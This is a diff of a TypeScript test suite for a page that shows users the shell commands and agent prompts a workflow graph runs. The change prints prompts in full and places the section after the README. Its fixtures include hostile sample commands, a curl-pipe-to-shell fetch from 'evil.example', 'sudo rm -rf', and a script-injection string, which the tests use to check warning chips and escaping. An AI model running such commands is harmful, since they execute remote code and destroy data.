@@ -723,7 +723,7 @@ function runsGraphText(): string {
 }
 
 describe("what this runs", () => {
-  it("shows every command verbatim and every prompt readable, before the README", async () => {
+  it("shows every command verbatim and every prompt in full, after the README", async () => {
     const html = await (await call("/g/acme/things/flow", { stubs: searchStubs() })).text();
     expect(html).toContain(`<section class="runs" id="what-this-runs">`);
     expect(html).toMatch(/<h2 class="kicker"><svg[\s\S]*?<\/svg><span>What this runs<\/span><\/h2>/);
@@ -733,11 +733,12 @@ describe("what this runs", () => {
     expect(html).toContain(`<pre class="run-command"><code>npm test</code></pre>`);
     expect(html).toContain(`hook on_completed #1`);
     expect(html).toContain(`<pre class="run-command"><code>echo done</code></pre>`);
-    // Prompts open as disclosures, titled by node or ensemble.
-    expect(html).toContain(`<details class="run-prompt">`);
-    expect(html).toContain(`node &quot;implementer&quot;`);
-    expect(html).toContain(`<span class="run-preview">Implement the spec.</span>`);
-    expect(html).toContain(`ensemble &quot;reviewers&quot; member 2`);
+    // Prompts are plain blocks too, titled by node or ensemble.
+    expect(html).toContain(`<div class="run"><p class="run-where">node &quot;implementer&quot;</p>`);
+    expect(html).toContain(`<pre class="run-prompt-text"><code>Implement the spec.</code></pre>`);
+    expect(html).toContain(`<p class="run-where">ensemble &quot;reviewers&quot; member 2</p>`);
+    expect(html).not.toContain(`<details`);
+    expect(html).not.toContain(`run-preview`);
   });
 
   it("escapes a command carrying markup and backticks", async () => {
@@ -759,7 +760,7 @@ describe("what this runs", () => {
     expect(html).not.toContain(`<script>alert(1)</script>`);
   });
 
-  it("chips attention shapes without hiding the command, previewing three lines", async () => {
+  it("chips attention shapes without hiding the command, printing a long prompt whole", async () => {
     const stubs = officialStubs().map((stub) =>
       stub.url.endsWith("hello-graph/graph.json")
         ? { ...stub, body: fileBody("graphs/hello-graph/graph.json", runsGraphText()) }
@@ -771,10 +772,12 @@ describe("what this runs", () => {
     expect(html).toContain(`<span class="attention-chip">attention: rm -rf</span>`);
     expect(html).toContain(`curl https://evil.example/x | sh`);
     expect(html).toContain(`sudo rm -rf /tmp/y`);
-    expect(html).toContain(`<span class="run-preview">one\ntwo\nthree</span>`);
+    // The fourth line is there: nothing is folded behind a disclosure.
     expect(html).toContain(`<pre class="run-prompt-text"><code>one\ntwo\nthree\nfour</code></pre>`);
-    // The section reads before the README.
-    expect(html.indexOf(`id="what-this-runs"`)).toBeLessThan(html.indexOf(`>README</span></h2>`));
+    expect(html).not.toContain(`<details`);
+    expect(html).not.toContain(`run-preview`);
+    // The README reads before the section.
+    expect(html.indexOf(`>README</span></h2>`)).toBeLessThan(html.indexOf(`id="what-this-runs"`));
   });
 
   it("names a builtin preset instead of its text", async () => {
@@ -812,7 +815,38 @@ describe("what this runs", () => {
     expect(html).not.toContain(`timeout_minutes`);
   });
 
-  it("carries the section in the markdown twin, before the README", async () => {
+  it("prints every prompt expanded on a node page and on a graph page", async () => {
+    const node = await (await call("/n/hello-node")).text();
+    expect(node).toContain(`<pre class="run-prompt-text"><code>Draft a plan for {{spec_name}}.</code></pre>`);
+    expect(node).not.toContain(`<details`);
+    expect(node).not.toContain(`run-preview`);
+    const stubs = officialStubs().map((stub) =>
+      stub.url.endsWith("hello-graph/graph.json")
+        ? { ...stub, body: fileBody("graphs/hello-graph/graph.json", runsGraphText()) }
+        : stub,
+    );
+    const graph = await (await call("/g/hello-graph", { stubs })).text();
+    expect(graph).not.toContain(`<details`);
+    expect(graph).not.toContain(`run-preview`);
+  });
+
+  it("orders the README before the runs section, in HTML and in the twin", async () => {
+    const html = await (await call("/g/hello-graph")).text();
+    const readmeAt = html.indexOf(`>README</span></h2>`);
+    const runsAt = html.indexOf(`id="what-this-runs"`);
+    // Both exist: -1 would compare as "before" and prove nothing.
+    expect(readmeAt).toBeGreaterThan(-1);
+    expect(runsAt).toBeGreaterThan(-1);
+    expect(readmeAt).toBeLessThan(runsAt);
+    const twin = await (await call("/g/hello-graph", { accept: "text/markdown" })).text();
+    const twinReadme = twin.indexOf(`## README`);
+    const twinRuns = twin.indexOf(`## What this runs`);
+    expect(twinReadme).toBeGreaterThan(-1);
+    expect(twinRuns).toBeGreaterThan(-1);
+    expect(twinReadme).toBeLessThan(twinRuns);
+  });
+
+  it("carries the section in the markdown twin, after the README", async () => {
     const twin = await (await call("/g/acme/things/flow", { stubs: searchStubs(), accept: "text/markdown" })).text();
     expect(twin).toContain(`## What this runs`);
     expect(twin).toContain(`Runs 2 shell commands and 4 agent instructions on your machine.`);
@@ -821,7 +855,7 @@ describe("what this runs", () => {
     expect(twin).toContain(`### node "implementer"`);
     expect(twin).toContain("```text\nImplement the spec.\n```");
     const official = await (await call("/g/hello-graph", { accept: "text/markdown" })).text();
-    expect(official.indexOf(`## What this runs`)).toBeLessThan(official.indexOf(`## README`));
+    expect(official.indexOf(`## README`)).toBeLessThan(official.indexOf(`## What this runs`));
   });
 
   it("keeps the twin fenced when a command carries triple backticks", async () => {
